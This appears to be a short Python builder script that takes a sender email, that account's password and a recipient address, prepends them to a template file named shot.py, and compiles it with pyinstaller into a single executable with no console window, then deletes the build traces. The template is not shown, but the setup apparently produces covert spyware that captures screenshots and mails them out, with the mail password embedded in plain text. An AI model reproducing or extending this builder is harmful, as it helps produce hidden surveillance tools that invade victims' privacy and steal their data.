import os
from sys import exit

os.system('cls')
os.system('copy Template\shot.py .\shot.py >nul')
email = input('Enter your email: ')
passd =  input('Enter your password: ')
to = input('Recipient email: ')

f = open('shot.py','r+')
readcontent = f.read()
f.seek(0, 0)
f.write('em = ' + "'" + email + "'" + '\n' + 'pas = ' + "'" + passd + "'" + '\n' + 't = ' + "'" + to + "'" + '\n' + readcontent)
f.close()
os.system('pyinstaller --noconsole --onefile -F shot.py')
os.system('rmdir /S /Q build __pycache__')
os.system('del shot.py shot.spec')
exit(0)
